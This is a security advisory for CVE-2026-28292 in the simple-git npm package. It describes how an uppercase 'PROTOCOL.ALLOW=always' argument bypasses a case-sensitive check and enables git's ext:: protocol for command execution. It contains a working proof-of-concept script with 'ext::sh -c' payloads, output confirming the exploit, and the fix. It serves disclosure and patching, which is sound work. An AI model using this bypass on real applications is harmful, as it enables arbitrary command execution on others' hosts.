# [C] simple-git has blockUnsafeOperationsPlugin bypass via case-insensitive protocol.allow config key enables RCE

## Summary
Severity: Critical
Advisory: GHSA-r275-fr43-pm7q
CVE: CVE-2026-28292
CWE: CWE-178, CWE-78
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-10
Source: https://github.com/advisories/GHSA-r275-fr43-pm7q
Type: github-advisory

## Affected
- npm: `simple-git` — affected >=3.15.0 <3.32.3

## Details
### Summary

The `blockUnsafeOperationsPlugin` in `simple-git` fails to block git protocol
override arguments when the config key is passed in uppercase or mixed case.
An attacker who controls arguments passed to git operations can enable the
`ext::` protocol by passing `-c PROTOCOL.ALLOW=always`, which executes an
arbitrary OS command on the host machine.

---

### Details

The `preventProtocolOverride` function in
`simple-git/src/lib/plugins/block-unsafe-operations-plugin.ts` (line 24)
checks whether a `-c` argument configures `protocol.allow` using this regex:

```ts
if (!/^\s*protocol(.[a-z]+)?.allow/.test(next)) {
   return;
}
```

This regex is case-sensitive. Git treats config key names
case-insensitively — it normalises them to lowercase internally.
As a result, passing `PROTOCOL.ALLOW=always`, `Protocol.Allow=always`,
or any mixed-case variant is not matched by the regex, the check
returns without throwing, and git is spawned with the unsafe argument.

**Verification that git normalises the key:**

```bash
$ git -c PROTOCOL.ALLOW=always config --list | grep protocol
protocol.allow=always
```

**The fix is a single character — add the `/i` flag:**

```ts
// Before (vulnerable):
if (!/^\s*protocol(.[a-z]+)?.allow/.test(next)) {

// After (fixed):
if (!/^\s*protocol(.[a-z]+)?.allow/i.test(next)) {
```

---

## poc.js

```js
/**
 * Proof of Concept — simple-git preventProtocolOverride Case-Sensitivity Bypass
 *
 * CVE-2022-25912 was fixed in simple-git@3.15.0 by adding a regex check
 * that blocks `-c protocol.*.allow=always` from being passed to git commands.
 * The regex is case-sensitive. Git treats config key names case-insensitively.
 * Passing `-c PROTOCOL.ALLOW=always` bypasses the check entirely.
 *
 * Affected : simple-git >= 3.15.0 (all versions with the fix applied)
 * Tested on: simple-git@3.32.2, Node.js v23.11.0, git 2.39.5
 * Reporter : CodeAnt AI Security Research (securityreseach@codeant.ai)
 */

const simpleGit = require('simple-git');
const fs = require('fs');

const SENTINEL = '/tmp/pwn-codeant';

// Clean up from any previous run
try { fs.unlinkSync(SENTINEL); } catch (_) {}

const git = simpleGit();

// ── Original CVE-2022-25912 vector — BLOCKED by the 2022 fix ────────────────
// This is the exact PoC Snyk used to report CVE-2022-25912.
// It is correctly blocked by preventProtocolOverride in block-unsafe-operations-plugin.ts.
git.clone('ext::sh -c touch% /tmp/pwn-original% >&2', '/tmp/example-new-repo', [
  '-c', 'protocol.ext.allow=always',   // lowercase — caught by regex
]).catch((e) => {
  console.log('ext:: executed:poc', fs.existsSync(SENTINEL) ? 'PWNED — ' + SENTINEL + ' created' : 'not created');
  console.error(e);
});

// ── Bypass — PROTOCOL.ALLOW=always (uppercase) ──────────────────────────────
// The fix regex /^\s*protocol(.[a-z]+)?.allow/ is case-sensitive.
// Git normalises config key names to lowercase internally.
// Uppercase variant passes the check; git enables ext:: and executes the command.
git.clone('ext::sh -c touch% ' + SENTINEL + '% >&2', '/tmp/example-new-repo-2', [
  '-c', 'PROTOCOL.ALLOW=always',       // uppercase — NOT caught by regex
]).catch((e) => {
  console.log('ext:: executed:', fs.existsSync(SENTINEL) ? 'PWNED — ' + SENTINEL + ' created' : 'not created');
  console.error(e);
});

// ── Real-world scenario ──────────────────────────────────────────────────────
// An application cloning a legitimate repository with user-controlled customArgs.
// Attacker supplies PROTOCOL.ALLOW=always alongside a malicious ext:: URL.
// The application intends to clone https://github.com/CodeAnt-AI/codeant-quality-gates
// but the injected argument enables ext:: and the real URL executes the command instead.
//
// Legitimate usage (what the app expects):
//   simpleGit().clone('https://github.com/CodeAnt-AI/codeant-quality-gates',
//                     '/tmp/codeant-quality-gates', userArgs)
//
// Attacker-controlled scenario (what actually runs when args are not sanitised):
const LEGITIMATE_URL = 'https://github.com/CodeAnt-AI/codeant-quality-gates';
const CLONE_DEST     = '/tmp/codeant-quality-gates';
const SENTINEL_RW    = '/tmp/pwn-realworld';
try { fs.unlinkSync(SENTINEL_RW); } catch (_) {}

const userArgs   = ['-c', 'PROTOCOL.ALLOW=always'];
const attackerURL = 'ext::sh -c touch% ' + SENTINEL_RW + '% >&2';

simpleGit().clone(
  attackerURL,   // should have been LEGITIMATE_URL
  CLONE_DEST,
  userArgs
).catch(() => {
  console.log('real-world scenario [target: ' + LEGITIMATE_URL + ']:',
    fs.existsSync(SENTINEL_RW) ? 'PWNED — ' + SENTINEL_RW + ' created' : 'not created');
});
```

---

## Test Results

### Vector 1 — Original CVE-2022-25912 (`protocol.ext.allow=always`, lowercase)

**Result: BLOCKED ✅**

The original Snyk PoC payload using lowercase `protocol.ext.allow=always` is correctly intercepted by `preventProtocolOverride` before git is invoked. A `GitPluginError` is thrown immediately and the sentinel file is never created.

**Output:**
```
ext:: executed:poc not created
GitPluginError: Configuring protocol.allow is not permitted without enabling allowUnsafeExtProtocol
    at preventProtocolOverride (.../simple-git/dist/cjs/index.js:1228:9)
    at .../simple-git/dist/cjs/index.js:1266:40
    at Array.forEach (<anonymous>)
    at Object.action (.../simple-git/dist/cjs/index.js:1264:12)
    at PluginStore.exec (.../simple-git/dist/cjs/index.js:1489:29)
    at GitExecutorChain.attemptRemoteTask (.../simple-git/dist/cjs/index.js:1881:36)
    at GitExecutorChain.attemptTask (.../simple-git/dist/cjs/index.js:1865:88) {
  task: {
    commands: [
      'clone',
      '-c',
      'protocol.ext.allow=always',
      'ext::sh -c touch% /tmp/pwn-original% >&2',
      '/tmp/example-new-repo'
    ],
    format: 'utf-8',
    parser: [Function: parser]
  },
  plugin: 'unsafe'
}
```

---

### Vector 2 — Uppercase bypass (`PROTOCOL.ALLOW=always`)

**Result: BYPASSED ⚠️ — RCE confirmed**

The `preventProtocolOverride` regex `/^\s*protocol(.[a-z]+)?.allow/` is case-sensitive. `PROTOCOL.ALLOW=always` (uppercase) passes the check without error. Git normalises config key names to lowercase internally, enabling the `ext::` protocol. The injected shell command executes before git errors on the missing repository stream.

**Output:**
```
ext:: executed: PWNED — /tmp/pwn-codeant created
GitError: Cloning into '/tmp/example-new-repo-2'...
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.

    at Object.action (.../simple-git/dist/cjs/index.js:1440:25)
    at PluginStore.exec (.../simple-git/dist/cjs/index.js:1489:29) {
  task: {
    commands: [
      'clone',
      '-c',
      'PROTOCOL.ALLOW=always',
      'ext::sh -c touch% /tmp/pwn-codeant% >&2',
      '/tmp/example-new-repo-2'
    ],
    format: 'utf-8',
    parser: [Function: parser]
  }
}
```

`/tmp/pwn-codeant` was created by the git subprocess — command execution confirmed.

---

### Vector 3 — Real-world scenario (target: `https://github.com/CodeAnt-AI/codeant-quality-gates`)

**Result: BYPASSED ⚠️ — RCE confirmed**

An application passes user-controlled `customArgs` to `simpleGit().clone()`. The attacker injects `PROTOCOL.ALLOW=always` and substitutes a malicious `ext::` URL in place of the intended repository URL. The plugin does not block the uppercase variant; git enables `ext::` and executes the payload before the application can detect the failure.

**Output:**
```
real-world scenario [target: https://github.com/CodeAnt-AI/codeant-quality-gates]: PWNED — /tmp/pwn-realworld created
```

`/tmp/pwn-realworld` was created — arbitrary command execution in a realistic application context confirmed.

---

## Summary

| # | Vector | Payload | Sentinel file | Result |
|---|--------|---------|---------------|--------|
| 1 | CVE-2022-25912 original | `protocol.ext.allow=always` (lowercase) | not created | Blocked ✅ |
| 2 | Case-sensitivity bypass | `PROTOCOL.ALLOW=always` (uppercase) | `/tmp/pwn-codeant` created | **RCE ⚠️** |
| 3 | Real-world app scenario | `PROTOCOL.ALLOW=always` + attacker URL | `/tmp/pwn-realworld` created | **RCE ⚠️** |

The case-sensitive regex in `preventProtocolOverride` blocks `protocol.*.allow` but does not account for uppercase or mixed-case variants. Git accepts all variants identically due to case-insensitive config key normalisation, allowing full bypass of the protection in all versions of simple-git that carry the 2022 fix.

`/tmp/pwned` is created by the git subprocess via the `ext::` protocol.

All of the following bypass the check:

| Argument passed via `-c` | Regex matches? | Git honours it? |
|--------------------------|:--------------:|:---------------:|
| `protocol.allow=always`  | ✅ blocked     | ✅              |
| `PROTOCOL.ALLOW=always`  | ❌ bypassed    | ✅              |
| `Protocol.Allow=always`  | ❌ bypassed    | ✅              |
| `PROTOCOL.allow=always`  | ❌ bypassed    | ✅              |
| `protocol.ALLOW=always`  | ❌ bypassed    | ✅              |

---

### Impact

Any application that passes user-controlled values into the `customArgs`
parameter of `clone()`, `fetch()`, `pull()`, `push()` or similar `simple-git`
methods is vulnerable to arbitrary command execution on the host machine.

The `ext::` git protocol executes an arbitrary binary as a remote helper.
With `protocol.allow=always` enabled, an attacker can run any OS command
as the process user — full read, write and execution access on the host.

## References
- https://github.com/steveukx/git-js/security/advisories/GHSA-r275-fr43-pm7q
- https://nvd.nist.gov/vuln/detail/CVE-2026-28292
- https://github.com/steveukx/git-js/commit/f7042088aa2dac59e3c49a84d7a2f4b26048a257
- https://github.com/steveukx/git-js
- https://www.codeant.ai/security-research/security-research-simple-git-remote-code-execution-cve-2026-28292
- https://www.codeant.ai/security-research/simple-git-remote-code-execution-cve-2026-28292
